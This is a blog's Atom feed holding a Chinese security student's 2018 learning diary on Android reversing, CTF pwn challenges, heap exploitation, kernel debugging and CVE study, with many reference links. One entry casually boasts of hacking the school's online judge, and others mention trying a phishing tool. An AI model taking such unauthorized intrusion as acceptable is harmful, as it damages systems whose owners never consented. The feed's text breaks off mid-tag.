<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sakuraのblog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://eternalsakura13.com/"/>
  <updated>2020-06-23T10:29:22.825Z</updated>
  <id>http://eternalsakura13.com/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sakuraのdiary</title>
    <link href="http://eternalsakura13.com/2099/09/18/study/"/>
    <id>http://eternalsakura13.com/2099/09/18/study/</id>
    <published>2099-09-18T14:05:42.000Z</published>
    <updated>2020-06-23T10:29:22.825Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2018-1-28"><a href="#2018-1-28" class="headerlink" title="2018-1-28"></a>2018-1-28</h2><p>1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）<br>2.配置shadow<br>尝试用gdb和gdbserver来调试<br><a href="https://github.com/CENSUS/shadow" target="_blank" rel="noopener">https://github.com/CENSUS/shadow</a><br><a href="https://developer.android.com/ndk/downloads/index.html?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/ndk/downloads/index.html?hl=zh-cn</a><br><a href="http://kiya.studio/2017/06/21/android-gdb/" target="_blank" rel="noopener">http://kiya.studio/2017/06/21/android-gdb/</a><br>shadow文档的几个坑点</p><ul><li>arm-linux-androideabi-gdb，也就是gdb-arm版没有提供，要自己找，我装了一个ndk r10e，然后弄了一个，嗯，r11移除了gdb。</li><li>在gdb remote之前，文档里没有写forward转发，导致我试的时候一直refuse</li></ul><p>3.晚上最大的收获是看到了一个不错的blog（android逆向CTF）<br><a href="http://kiya.studio/2333/03/03/android-reversing-skills/#more" target="_blank" rel="noopener">http://kiya.studio/2333/03/03/android-reversing-skills/#more</a></p><h2 id="2018-1-29"><a href="#2018-1-29" class="headerlink" title="2018-1-29"></a>2018-1-29</h2><ol><li>看玄武的<a href="https://mp.weixin.qq.com/s/mOaXkGTY2704P6TV2KBvwg" target="_blank" rel="noopener">每日安全推送</a>，主要看了WinAFL</li><li>nexus5被我刷成砖……然后顺手把刷机、root和装xposed全都整理了一遍。</li><li>webkit的poc断点找到了，可以调了</li><li>做了一道阿里CTF第二题，一道关于反调试的题。</li></ol><h2 id="2018-1-31"><a href="#2018-1-31" class="headerlink" title="2018-1-31"></a>2018-1-31</h2><ol><li>看AI直播调webkit，感觉调浏览器好难呀。</li><li>看玄武的<a href="https://mp.weixin.qq.com/s/M4QZxs_G-lZ810o_i2KJhA" target="_blank" rel="noopener">每日安全推送</a>，主要关注了反调试和使用Strava 热力图来推断军事基地位置，很有趣的思路。</li><li>研究了一下加固原理和脱壳基础：dvmDexFileOpenPartial，还挺简单的。</li><li>研究了ptrace和调试器原理，了解了ptrace反调试的一些技巧</li></ol><h2 id="2018-2-1"><a href="#2018-2-1" class="headerlink" title="2018-2-1"></a>2018-2-1</h2><ol><li>本来想今天研究一下ndk编译的，不过睡着了……然后也没看什么东西</li><li>帮学弟解决了一些搭建博客的bug，顺便自己把博客的主题配色，代码高亮，搜索，评论什么的都修改或添加了，好看多了……</li></ol><h2 id="2018-2-2"><a href="#2018-2-2" class="headerlink" title="2018-2-2"></a>2018-2-2</h2><ol><li>看玄武的<a href="https://xuanwulab.github.io/cn/secnews/2018/02/02/index.html" target="_blank" rel="noopener">每日安全推送</a></li><li>钓鱼网站那个很有趣，我就测试了一下，然后因为ss代理不走终端，找了<a href="https://juejin.im/entry/5821840cd203090055134cc0" target="_blank" rel="noopener">一篇文章</a>和<a href="https://blog.kelu.org/tech/2017/07/06/parallels-vm-use-proxy-with-host-on-mac.html" target="_blank" rel="noopener">另一篇文章</a>，配置了一下就好了~</li><li>自己实践了一下那个钓鱼工具，实践文章和终端那个都可以在”杂项”分类里找到</li><li>研究了一下怎么用ndk-build编译一个能在手机上运行的c程序，这样明天就可以尝试hook了</li></ol><h2 id="2018-2-3"><a href="#2018-2-3" class="headerlink" title="2018-2-3"></a>2018-2-3</h2><ol><li>今天没有玄武的推送看~</li><li>研究了android native层hook，算是学到不少东西了。</li></ol><h2 id="2018-2-4"><a href="#2018-2-4" class="headerlink" title="2018-2-4"></a>2018-2-4</h2><ol><li>写了第一个xposed程序~遇到了一些坑，不过还是趟过去了。</li><li>修改nexus5的boot.img,打开系统调试，又坑了我一会。。</li></ol><h2 id="2018-2-5"><a href="#2018-2-5" class="headerlink" title="2018-2-5"></a>2018-2-5</h2><ol><li>今天出去怠惰了（茶）</li><li>xposed继续学习了一下，学会了一些姿势，感觉还是不错的~</li></ol><h2 id="2018-2-6"><a href="#2018-2-6" class="headerlink" title="2018-2-6"></a>2018-2-6</h2><ol><li>研究了怎么搭建shadowsocks服务端和优化</li><li>自己写了一个基于flask的B/S端口扫描器，代码太难看就不放了（茶</li></ol><h2 id="2018-2-7"><a href="#2018-2-7" class="headerlink" title="2018-2-7"></a>2018-2-7</h2><ol><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/FM-mZh1e8YQP0MWrV1IlVw" target="_blank" rel="noopener">2.6</a>和<a href="https://mp.weixin.qq.com/s/2JMrsyyuTErVy-pXRoL3Jg" target="_blank" rel="noopener">2.7</a><br>wordpress DOS有点意思，不过没搞懂，另外主要看了android安全公告2月版，看懂了一些（限于原理），开发太菜了。</li><li>学习了android的jni开发，基本的都摸了一遍。</li></ol><h2 id="2018-2-8"><a href="#2018-2-8" class="headerlink" title="2018-2-8"></a>2018-2-8</h2><ol><li>继续昨天的jni学习，摸清了native方法的动态注册</li><li>研究了下.init_array,结合jni动态注册，做了一道CTF题</li><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/sqPmC-z-HiH4UKArE1Gdgw" target="_blank" rel="noopener">2.8</a>,这篇<a href="https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html" target="_blank" rel="noopener">钓鱼</a>的有趣</li><li>给AI写了个爬页面上文件的爬虫。</li></ol><h2 id="2018-2-9"><a href="#2018-2-9" class="headerlink" title="2018-2-9"></a>2018-2-9</h2><ol><li>研究android构建过程，Gradle工作流程</li><li>读玄武每日推送（存了个移动端静态分析的github准备好好看看）</li></ol><h2 id="2018-2-10"><a href="#2018-2-10" class="headerlink" title="2018-2-10"></a>2018-2-10</h2><ol><li>研究Dex文件格式和修复</li><li>学习了用ddms来dump出运行内存做题的技巧。</li><li>学习了新建android工程，调so文件解题。</li></ol><h2 id="2018-2-11"><a href="#2018-2-11" class="headerlink" title="2018-2-11"></a>2018-2-11</h2><ol><li>把昨天看到一道递归算法的android re做了，感觉现在做一般的CTF都有点思路了，做看雪的还是GG，还要提高姿势水平。</li><li>今天上午看到我在知乎的提问有师傅回答我了：<a href="https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。" target="_blank" rel="noopener">https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。</a></li><li>今天下午做完题就又瞎看了一会，思考我是不是选错了方向……android的调试贼麻烦，资料还贼少，看了看看雪，主要是浏览器、文件格式和内核，虽然其实都一样的，那些资料也不多，没法挖洞的……认识的dalao又少，没法充分交流QAQ，唉，感觉我是不是不适合当黑客，看vulcan的师傅微博，月月一大批CVE，就我什么都挖不到，不过今晚看了看师傅们的博客，他们的心路历程给了我很大勇气，是的，我早就不打算退后了，只有前进而已。</li></ol><h2 id="2018-2-12"><a href="#2018-2-12" class="headerlink" title="2018-2-12"></a>2018-2-12</h2><ol><li>今天刷空间看到moctf比赛，就参加了下，把android/linux re做掉就没看了。</li><li>依然很迷茫，不过其实想想，我开始学二进制，其实也就不到半年，进步速度并不是不能接受，只是在技能进阶上卡住了又没人交流而已，嗯，再想想好了。</li></ol><h2 id="2018-2-13到19"><a href="#2018-2-13到19" class="headerlink" title="2018-2-13到19"></a>2018-2-13到19</h2><ol><li>这些天几乎都过年去了……然后唯一做了点事就是把自己的课程设计做了，<a href="https://github.com/eternalsakura/PortScan" target="_blank" rel="noopener">PortScan</a></li><li>新年新气象，最近家里的事情也是乱七八糟，能多学点赚钱的技术分担压力就好了。</li><li>下学期的计划——fuzz、CVE漏洞研究、前端后端的一些Web开发（写点相关项目练手），然后找实习。</li><li>学会了一项新的运动，保龄球，很有意思。</li><li>最近一直什么都没学，自己也在反思一些东西，寻找一个前进的点。<br>比如浏览器，文件格式，还是内核，或者其他，还是都不是。<br>安全只是个抽象的概念，具体化了才能变成业务。<br>我还需要探究一段时间，读很多的漏洞分析文章，追随前辈们走过的路途，再进一步反思。<br>“一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&gt; exploitable bug(vulnerability) –&gt; poc –&gt; exploit –&gt; reliable/weaponized exploit。虽然大家都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但我们真正关心的漏洞应该是能到最后两个阶段的vulnerability。”</li></ol><h2 id="2018-2-20到21"><a href="#2018-2-20到21" class="headerlink" title="2018-2-20到21"></a>2018-2-20到21</h2><ol><li>返校真是艰难……飞机火车客车出租全都转了一遍才到……</li><li>晚上收拾了下房间，看了看看雪，发现师傅做的有趣CTF题，<a href="https://bbs.pediy.com/thread-224686.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224686.htm</a></li><li>群里在讨论内存管理和hook，被推荐了一本腾讯的手游安全的书《游戏安全：手游安全技术入门》，还不错，可以入个门……</li><li>看到一个博客提供了一些自定义ROM的资料，最近也想改，看到了就记录一下。<a href="https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338" target="_blank" rel="noopener">https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338</a></li></ol><h2 id="2018-2-22"><a href="#2018-2-22" class="headerlink" title="2018-2-22"></a>2018-2-22</h2><ol><li>看了《手游安全技术那本书》，学习了注入技术。</li><li>下午买了考虫的口语能力提升班，然后学习了下</li><li>晚上在seebug逛，找各种二进制漏洞分析的资料，然后看到了陈良的ppt,remet的github,韩子诺的文章，还有很多很多……CVE-2014-7911感觉可以调调，我得整理整理我搜的资料，然后按照原理-&gt;漏洞分析-&gt;exp去学习w</li></ol><h2 id="2018-2-23到25"><a href="#2018-2-23到25" class="headerlink" title="2018-2-23到25"></a>2018-2-23到25</h2><ol><li>是的，仔细算算，我已经编译AOSP编译了三天了，而且还没编译好……现在已经基本放弃在mac上编译了，我现在突然想,flanker大神之所以用ubuntu做主力机……是不是因为在mac上编译不出AOSP呀……(逃)</li><li>明天在旧电脑上装win/ubuntu的双系统，要不是因为这学期有win网络编程和c#开发……我就直接烧ubuntu进去了（撑脸</li><li>嗯，不用明天了，在今天的收尾……新学期的开始……我终于是守得云开见月明，把AOSP弄出来了！</li></ol><h2 id="2018-2-26"><a href="#2018-2-26" class="headerlink" title="2018-2-26"></a>2018-2-26</h2><ol><li>学习了stack pivot，<a href="http://tacxingxing.com/2017/05/10/stack-pivot/" target="_blank" rel="noopener">劫持栈指针</a></li><li>学习了heap spray,<a href="http://secwiki.neu.edu.cn/wiki/images/f/fe/%E5%86%85%E5%AD%98%E5%96%B7%E5%B0%84%E5%9C%A8%E5%AE%89%E5%8D%93Root%E5%88%A9%E7%94%A8%E4%B8%AD_%E9%99%88%E8%89%AF.pdf" target="_blank" rel="noopener">堆喷</a></li><li>学习了<a href="http://pwn4.fun/2016/11/20/C-虚函数调用攻防战/" target="_blank" rel="noopener">虚表攻防</a></li><li>了解android<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back.pdf" target="_blank" rel="noopener">root</a></li><li>Time-of-check Time-of-use (TOCTOU) Race Condition</li><li>今天还是认真的研究了一下之前没调出来的cve-2015-3864，因为这个漏洞有完整的利用链资料，非常的棒，虽然可能调不了什么的，但是理解这个利用过程也很有意义。<br>还是要感谢一下看雪师傅的<a href="https://bbs.pediy.com/thread-222893.htm" target="_blank" rel="noopener">文章</a>，还加了好友0.0，感觉要是我一开始就是编译的AOSP去调试……可能寒假就调出来了2333，反正感觉今天还是很有收获的。</li></ol><h2 id="2018-2-27"><a href="#2018-2-27" class="headerlink" title="2018-2-27"></a>2018-2-27</h2><ol><li>一上午调了道64位rop，还没调出来..exm???是这题的错还是我的错…多看看别人的exp好了，以前还是做题不够，积累不够。</li><li>继续看stagefright好了，争取今天多少调一调。</li><li>好吧，没看进去，gp0的exp大致看懂了，不过metaphor的思路还是费解，可能我现在的理解力还是不够。</li><li>下午一直在整理之前看的ptmalloc的一些基本概念，虽然意义不是很大，但是理一理总是好的，还是要为ctf-wiki打call，里面写了非常多的干货，明天继续整理。</li></ol><h2 id="2018-2-28"><a href="#2018-2-28" class="headerlink" title="2018-2-28"></a>2018-2-28</h2><ol><li>体育课累死……密码学数学基础有趣。</li><li>今天把heap exploit的unlink整理了一下，虽然最后那个例子有点问题，我换了两个系统都没成功，但是原理还是理清了，真的是都快忘了……</li></ol><h2 id="2018-3-1"><a href="#2018-3-1" class="headerlink" title="2018-3-1"></a>2018-3-1</h2><ol><li>又混了篇看雪的优秀，感觉还是蛮有成就感的，自己发的文章都不是优秀就是精品。</li><li>今天有点怠惰呢，明天要继续努力。</li></ol><h2 id="2018-3-2"><a href="#2018-3-2" class="headerlink" title="2018-3-2"></a>2018-3-2</h2><ol><li>今天一天都在整理fastbin的一个内容（其实还玩了一会Web，黑掉学校OJ嘿嘿嘿）</li><li>这道赛题略难，然后跟团队练习赛的PragyanCTF，感觉这赛题像是file io啊。。谁出的题这么皮。。</li></ol><h2 id="2018-3-3"><a href="#2018-3-3" class="headerlink" title="2018-3-3"></a>2018-3-3</h2><ol><li>生日快乐~自己，去订了蛋糕，今天继续研究了一下那个fastbin的题，真的很难。。</li><li>把android kernel也编译了出来，这次真的是可以调了。。</li></ol><h2 id="2018-3-4"><a href="#2018-3-4" class="headerlink" title="2018-3-4"></a>2018-3-4</h2><ol><li>今天和实验室大一的聊了下，然后把我能知道的东西，方向什么的，都聊了一下。</li><li>9447 CTF 2015的fastbin是真的难……我还是不懂，算了算了，明天看点别的吧，这个todo。</li><li>今天和一个师傅聊了下IoT漏洞应该怎么挖，受益匪浅，但是转换为具体的硬实力还需要多看多学多调。</li></ol><h2 id="2018-3-5"><a href="#2018-3-5" class="headerlink" title="2018-3-5"></a>2018-3-5</h2><ol><li>今天把那道fastbin的题认真的理了理，其实也不是很难，然后又把pragyan ctf2018的两道pwn题做了一下，第一道还好，那个目录遍历没理解上，看了wp会了，第二道就有点迷，静态链接下的格式化字符串漏洞，没办法覆盖got表，看了一篇wp是覆盖malloc_hook，这不是我白天看的那道fastbin的套路么……真的是……然后打开栈执行，这……真是脑洞，又感觉自己很菜……</li><li>嗯w，文章又被看雪推送了，还是感觉蛮不错的……希望能认识更多人吧w，今天看了看玄武每日推送的目录，非常nice，准备找个时间把这段时间没看的都啃一下。</li></ol><h2 id="2018-3-6"><a href="#2018-3-6" class="headerlink" title="2018-3-6"></a>2018-3-6</h2><ol><li>上周的比赛，搞到今天总算是大致调完了，就只剩一个点不懂，也是实在搞不懂了，教主说的很有道理，只有把文章写成博客，发出去，才能检验你到底对这个东西的理解怎么样，事实上，也只有在学习中的我，才会如此详细的写wp吧。</li></ol><h2 id="2018-3-7-8"><a href="#2018-3-7-8" class="headerlink" title="2018-3-7-8"></a>2018-3-7-8</h2><ol><li>这两天把漏洞战争的环境大致搭了一下，从用windbg到看到符号，还是折腾了一下。</li></ol><h2 id="2018-3-9-10"><a href="#2018-3-9-10" class="headerlink" title="2018-3-9-10"></a>2018-3-9-10</h2><ol><li>调了一下漏洞战争堆的第一个binary，然后熟悉了一下工具使用，还是nice.</li><li>调了cve-2012-1876的poc，发现了一些书上没有提到的地方和一个错误，就不提勘误了…都出了这么久了…原理差不多懂了，很有趣。</li><li>今天有意想不到的收获，或者说机会吧，希望我能把握好，然后做好安全研究，成为一个优秀的黑客。</li><li>列一个CVE调试计划吧，目前进度1/10<br>浏览器</li><li>7 CVE-2012-1876,堆溢出（p2o ie9)</li><li>3 CVE-2011-0027,整数溢出漏洞 (p2o ie8)</li><li>6 CVE-2013-2551,整数溢出漏洞(p2o ie10)</li><li>4 CVE-2013-1347,UAF(ie)<br>android</li><li>7 CVE-2014-3153 anroid kernel提权</li></ol><h2 id="2018-3-11-12"><a href="#2018-3-11-12" class="headerlink" title="2018-3-11-12"></a>2018-3-11-12</h2><ol><li>这两天进度比较低迷，第一天直接莽上去调exp然后被打脸…今天把vupen的文章仔细读了一遍，把整个利用过程理解了一下。</li><li>说来有个有趣的点，p2o之后cve-2012-1876不是应该补了么，怎么在win8+ie10上还能利用，更有趣的是vupen明明用这个洞getshell了ie9，但是为什么keen在Study of Exploit Migitation in Modern Browsers这个ppt上说了bstr的分配不再能被利用，那vupen到底是怎么写的exp…</li><li>最近的计划（才怪…</li></ol><ul><li>编译的前端后端</li><li>kernel的漏洞</li><li>看diff写poc…</li></ul><h2 id="2018-3-13-14"><a href="#2018-3-13-14" class="headerlink" title="2018-3-13-14"></a>2018-3-13-14</h2><ol><li>密码学数学基础和算法这些课也就算了，晚上还有软件开发的课，各种文档什么的…能不能好好lu代码，把之前写的项目project答辩完了。</li><li>等到了想等的结果，收心认真学习了。</li><li>晚上把计算机系统素养里的部分内容（VM）又看了一下，十分有意义。</li><li>为了学编译原理，先自己lu一个c语言解释器了解个大概吧。</li></ol><h2 id="2018-3-15-17"><a href="#2018-3-15-17" class="headerlink" title="2018-3-15-17"></a>2018-3-15-17</h2><ol><li>这几天把write a c interpret看完了，大致了解了编译器前后端，当然肯定现在还是不会写的。</li><li>调cve-2012-7864,虽然称不上调通exp，但是大部分都调出来了，poc调的很顺利，在exp就处处踩坑。</li><li>说来好像webkit的dom的堆被分开了，以后就不会有那么多uaf了。</li></ol><h2 id="2018-3-18-20"><a href="#2018-3-18-20" class="headerlink" title="2018-3-18-20"></a>2018-3-18-20</h2><ol><li>日记还是要每天记……都忘了自己每天做了什么了……把c++的project做完了，做了两道pwn题。</li><li>看了一下LCTF2017的题目,large bin的unlink确实没练过，还有一道simpleVM改的题，都做做好了。</li></ol><h2 id="2018-3-21-25"><a href="#2018-3-21-25" class="headerlink" title="2018-3-21-25"></a>2018-3-21-25</h2><p>lctf2017的题目里学到不少东西，另外关于堆利用的姿势实在是不足，此外无libc利用这个也要再学习一下。<br>这几天除了两个project写，还打了强网杯，感觉就是什么都不会吧。。可能不该死磕一道题，应该都看看？…啊啊啊，难受死了，离顶尖水平差的根本不是一点半点……<br>还看了一篇清华的论文，非常nice。<a href="http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1</a><br>还是有的挫败呢，离别人的水平。</p><h2 id="2018-3-26"><a href="#2018-3-26" class="headerlink" title="2018-3-26"></a>2018-3-26</h2><p>1.读玄武每日推送[<a href="http://chuansong.me/n/2253059751415]" target="_blank" rel="noopener">http://chuansong.me/n/2253059751415]</a>.</p><ul><li>mark一下<a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" target="_blank" rel="noopener">windows kernel漏洞利用</a>，mark一下k0师傅的<a href="https://whereisk0shl.top/post/2018-03-21" target="_blank" rel="noopener">UBUNTU 16.04 EBPF ARBITRARY READ/WRITE 漏洞分析</a>和360src的<a href="https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11" target="_blank" rel="noopener">这篇</a>,看来调kernel还是有的调。</li><li>看到的<a href="https://github.com/sashs/arm_exploitation/blob/master/exploitation_on_arm_based_systems.pdf" target="_blank" rel="noopener">ARM exp开发</a>就很简略，感觉学不到什么东西。</li><li>mark一个超棒的<a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">linux kernel交互图</a>，还能在页面上点击跳转到资料<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-LKM3_2048.png" alt=""></li><li>还有一个Stack pivoting  exploit的图收了,不知道他们怎么画的图这么好看。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-030340.jpg" alt=""></li><li><a href="https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5a00963153450a8779b23489/1509987890282/Windows" target="_blank" rel="noopener">windows注册表审计</a>感觉以后用得到</li><li><a href="https://twitter.com/_niklasb/status/977141034059747328" target="_blank" rel="noopener">p2o的沙盒逃逸漏洞</a>这个感觉十分有意思。</li><li>blackhat上总有很多好议题，比如这个<a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="noopener">绕过ASLR的新思路</a></li></ul><p>2.准备配linux kernel的调试环境，真的是……配不起来啊，双机调试，拉取符号文件，设置串口，改配置开启调试功能。rbq,rbq<br>3.加入了chamd5团队，有师傅一起学pwn，一起讨论真是太棒了QVQ</p><h2 id="2018-3-27"><a href="#2018-3-27" class="headerlink" title="2018-3-27"></a>2018-3-27</h2><ol><li>上午和出强网杯kernel题的师傅聊了一下kernel的调试环境搭建和赛题，师傅人蛮好。。<br>搭建的话，muhe师傅的<a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85837</a></li></ol><p><strong>编译linux 注意去掉不必要的东西，然后编译busybox 然后插入内核写linux init 最后制作cpio</strong><br>这样就可以qemu+gdb调试了，很nice。</p><ol start="2"><li>下午和晚上忙各种杂七杂八的事情反正……不过总算还是把要复盘的赛题做完了。</li><li>另外，感觉自己的努力和天赋还是被人肯定的，加油吧，自己QVQ。</li></ol><h2 id="2018-3-28"><a href="#2018-3-28" class="headerlink" title="2018-3-28"></a>2018-3-28</h2><ol><li>人生这种东西，其实就是起起落落落落落落落落落落落落落落落落落落落落落落落落落落落落，23333<br>瞎看了半天linux inside，还看了下linux x86-64 asm，感觉没什么进展。</li><li>晚上在知乎提了个问题，别人指了一条很nice的路线给我，还和其他人get了一点点资料，感觉我应该也是可以搞的吧，嗯哼。<br>其实今天一直比较浮躁，还是昨天晚上的一些后遗症吧，还有就是期望和现实的落差……<br>不过冷静的回想一下，不能让自己立刻从舒适区脱离，从新掌握新的知识，那怎么进步呢？且行且努力（乖巧</li></ol><h2 id="2018-3-29"><a href="#2018-3-29" class="headerlink" title="2018-3-29"></a>2018-3-29</h2><ol><li>这几天事挺多的，今天才把blackhat的ppt都下载下来,然后看了下<a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488" target="_blank" rel="noopener">linux符号解析</a>还发现了一个<a href="https://github.com/elfmaster/skeksi_virus" target="_blank" rel="noopener">正在开发中的linux病毒</a></li><li>收集了蛮多linux kernel资料慢慢啃……今天啃了两个ppt，纯英文的那么多……我也是很意外自己读起来没什么障碍的……<br>学什么都要一步一步呀，能调通一个，调试就没什么了，后面的学习速度就看对于kernel和保护的理解了。</li></ol><h2 id="2018-3-30-31"><a href="#2018-3-30-31" class="headerlink" title="2018-3-30-31"></a>2018-3-30-31</h2><ol><li>这两天发生的事情还蛮多的，最近发生的一些事让我觉得，自己调的真洞还是太少，调就要调出来还要能调通，不过说实话吧……浏览器和kernel的洞真的不好调，我学二进制又不久……现在比赛练pwn都来不及，还要分身调洞，确实有点难啊……</li><li>不过kernel的ppt啃了俩，感觉纯英文的资料也就那个样子了，读起来还是挺流畅的，要是真的不懂换成中文我也不懂……</li><li>把kernel题的环境搭起来了，有师傅请教真的是比自己搞好太多……另外堆的题感觉有感觉了，准备给自己一个比较长的训练周期，比如十天，彻底脑内模拟透，最近进步还是蛮多，加油。<br>mark一个师傅的<a href="http://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">博客</a></li></ol><h2 id="2018-4-1-3"><a href="#2018-4-1-3" class="headerlink" title="2018-4-1-3"></a>2018-4-1-3</h2><ol><li>打了一场0ctf，感觉自己还是太菜，不过在师傅们的帮助下，把能搞懂的题都搞懂了，学到很多很多东西，还是很开心的。</li><li>写wp太麻烦了坦白说。。不过还是写吧，不写的话自己都不知道能记得多久……</li></ol><h2 id="2018-4-4-11"><a href="#2018-4-4-11" class="headerlink" title="2018-4-4-11"></a>2018-4-4-11</h2><ol><li>这几天电脑键盘坏了，电脑送修什么都没干。下了个吃鸡手游，嗯，还挺好玩的，今天早上电脑到了删了。</li><li>把0ctf2018的4道pwn复盘完了，折腾kernel调试环境。。还是挺麻烦的。</li><li>想要的很简单，得到却很难，好想去实验室做安全研究。</li></ol><h2 id="2018-4-12"><a href="#2018-4-12" class="headerlink" title="2018-4-12"></a>2018-4-12</h2><ol><li>今天从qemu+gdb，各种花式报错，到搭建内核的双机调试，简直了……总算最后是勉强在win机器上弄好了。<br>今天得到的一个启发是，先找一个可以用的方案去做，不要想什么一次做到最好，到有机会再换方案。</li><li>英语作业还没做……唉……赶作业赶作业……</li></ol><h2 id="2018-4-13"><a href="#2018-4-13" class="headerlink" title="2018-4-13"></a>2018-4-13</h2><ol><li>今天也是一堆事情，睡到中午然后开始做ddctf，那个逆向的mips还有android逆向的RSA，pwn的win kernel exploit真的是有、意思。反正我不想做了，不如学习一个<a href="https://blog.betamao.me/2018/02/26/ptmalloc%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">新姿势</a></li><li>linux kernel调试的环境算是彻底搭好了，今天解决了两个昨天没解决的bug，已经可以看到源码了。</li></ol><h2 id="2018-4-14-15"><a href="#2018-4-14-15" class="headerlink" title="2018-4-14-15"></a>2018-4-14-15</h2><ol><li>解决了内核不能单步调试的问题，然后在复习信安数学了。。再不看要凉了</li><li>仔细跟了一下poc，感觉还是能看懂的。</li></ol><h2 id="2018-4-16-17"><a href="#2018-4-16-17" class="headerlink" title="2018-4-16-17"></a>2018-4-16-17</h2><ol><li>自己看了下日记，4月除了修电脑配环境，几乎什么都没做，这段时间心态太浮躁了，嗯，加个太，也要准备投几家实习了，本来以为可以拿到的offer，都感觉凉了，不过算了，我是要去实验室做安全研究的人呢。</li><li>分析了cve-2017-8890的漏洞成因和模型还有patch</li></ol><h2 id="2018-4-18"><a href="#2018-4-18" class="headerlink" title="2018-4-18"></a>2018-4-18</h2><ol><li>今天也是一堆的课，晚上和师傅们聊天聊八卦去了。。结果只把UAF对象的分配和释放调了调。</li><li>了解了一下实验室面试啥的，要好好调CVE了。</li></ol><h2 id="2018-4-19"><a href="#2018-4-19" class="headerlink" title="2018-4-19"></a>2018-4-19</h2><ol><li>看了看师傅们的面试题，觉得其实自己还能再抢救一下。。</li><li>今天看了长亭的kernel的洞，感觉分析成因还是很好分析的…但是exp调起来麻烦，也懒得写博客记录了，今天把webkit的调试记录了一下，明明好久之前就搞了，结果到现在还是这样没什么进展（茶</li></ol><h2 id="2018-4-20-21"><a href="#2018-4-20-21" class="headerlink" title="2018-4-20-21"></a>2018-4-20-21</h2><ol><li>编了一天v8，搞不出来，墙真讨厌。</li><li>调（看）了一个webkit的UAF漏洞，还行，感觉最难懂的还是对象之间的引用关系太复杂，还有就是回调函数跟着跟着容易找不到自己在哪。<br>“我是谁，谁在打我。”（逃）</li></ol><h2 id="2018-4-22-24"><a href="#2018-4-22-24" class="headerlink" title="2018-4-22-24"></a>2018-4-22-24</h2><ol><li>打了一场*ctf，又学到了新姿势。</li><li>在看v8，看JIT，看R大的回答，xjb搜文章，还是不错。</li><li>调通了p2o的一个v8的oob的洞，cve-2017-5053,还是不难。</li></ol><h2 id="2018-4-25-28"><a href="#2018-4-25-28" class="headerlink" title="2018-4-25-28"></a>2018-4-25-28</h2><ul><li><p>补一些浏览器的基础吧</p></li><li><p>学习了一下一个新的内核洞，有新的trick总结</p></li><li><p>最近觉得该搞搞利用了，路由器固件也可以玩一下，安全研究这么有趣，什么都能摸一下（才怪</p></li></ul><h2 id="2018-4-29-30"><a href="#2018-4-29-30" class="headerlink" title="2018-4-29-30"></a>2018-4-29-30</h2><ol><li>国赛打完了，各种不走心，状态奇差，混进赛区半决赛了，CTF也玩到这了吧先，后面好好研究浏览器。</li><li>看了Natalie Silvanovich写的How to Find JavaScript Vulnerabilities with Code Review</li></ol><ul><li>Determine intended functionality</li><li>Review implementation of important features</li><li>Review previously reported bugs</li><li>Brainstorm likely vulnerable areas</li><li>Review code!<br>Mozilla docs (MDN) is a great start for JS</li></ul><ol start="3"><li>想翻一些议题视频看的时候翻到了一个仓库，js vul的，存一下，<a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">js-vuln-db</a></li></ol><h2 id="2018-4-31-5-2"><a href="#2018-4-31-5-2" class="headerlink" title="2018-4-31-5.2"></a>2018-4-31-5.2</h2><ol><li>看了一个js optimized code<a href="https://www.microsoft.com/en-us/research/video/chakra-script-optimized-code/" target="_blank" rel="noopener">视频</a>，虽然是chakra的<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-02-074634.png" alt=""><br>不过感觉，有点没用…这些我都知道（</li><li>看v8的gc,利用和各种，反正还是挺迷的，先看吧QVQ</li><li>看到一幅很棒的图，新的v8的执行图？<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-02-151804.jpg" alt=""></li><li>看webkit技术内幕找灵感，看洞有点看不明白了。</li></ol><h2 id="2018-5-3"><a href="#2018-5-3" class="headerlink" 